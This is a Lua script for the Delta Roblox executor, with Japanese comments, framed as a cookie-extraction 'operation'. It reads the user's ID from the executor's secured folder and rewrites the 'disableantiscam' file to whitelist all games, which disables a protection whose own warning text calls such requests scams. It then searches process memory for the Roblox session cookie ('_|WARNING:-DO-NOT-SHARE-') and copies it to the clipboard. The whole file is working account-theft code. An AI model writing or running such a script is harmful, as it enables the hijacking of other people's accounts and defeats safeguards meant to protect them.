-- Delta 実況中継型・同期＆クッキー抽出プロトタイプ

local function log(msg)
    print("[PROJECT-LOG] " .. tostring(msg))
end

local function safe_execute()
    log("--- 作戦開始 ---")

    local user_id_path = "Delta/Internals/Secured/user_id"
    local antiscam_path = "Delta/Internals/Secured/disableantiscam"
    local real_id = ""

    -- 1. user_id ファイルの読み取り検証
    log("ステップ1: user_id の読み取りを試行中...")
    local success, result = pcall(function()
        return readfile(user_id_path)
    end)

    if success then
        if result and result ~= "" then
            real_id = result
            log("SUCCESS: ID取得完了 -> [" .. real_id .. "]")
        else
            log("FAILED: ファイルは読めたが中身が空だ。")
        end
    else
        log("ERROR: readfile(" .. user_id_path .. ") が失敗。理由: " .. tostring(result))
        -- 代替案: もしIDが読めないなら identity を偽装するか、一旦保留
    end

    -- 2. disableantiscam の書き換え
    if real_id ~= "" then
        log("ステップ2: disableantiscam の同期を開始...")
        local payload = {
            ["WARNING"] = "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!",
            ["allowed_games"] = "*",
            ["user_id"] = real_id,
            ["version_num"] = 707
        }
        
        local json_success, json_data = pcall(function()
            return game:GetService("HttpService"):JSONEncode(payload)
        end)

        if json_success then
            local write_success, write_err = pcall(function()
                writefile(antiscam_path, json_data)
            end)

            if write_success then
                log("SUCCESS: disableantiscam をホワイトリスト化。")
            else
                log("ERROR: writefile 失敗。理由: " .. tostring(write_err))
            end
        else
            log("ERROR: JSONエンコード失敗。")
        end
    end

    -- 3. クッキーのメモリ探索 & クリップボード送信
    log("ステップ3: メモリ(GC)からクッキーを蒸留中...")
    local objects = getgc(true)
    local found = false
    local pattern = "_|WARNING:-DO-NOT-SHARE-"

    for _, v in pairs(objects) do
        if type(v) == "string" and string.find(v, pattern) then
            log("SUCCESS: クッキーの断片を検知。")
            
            local clip_success, clip_err = pcall(function()
                setclipboard(v)
            end)

            if clip_success then
                log("MISSION COMPLETE: クリップボードにトドメを刺した。")
            else
                log("ERROR: setclipboard 失敗。理由: " .. tostring(clip_err))
            end
            found = true
            break
        end
    end

    if not found then
        log("FAILED: メモリ上にクッキーが見当たらない。")
    end

    log("--- 作戦終了 ---")
end

-- 実行
safe_execute()
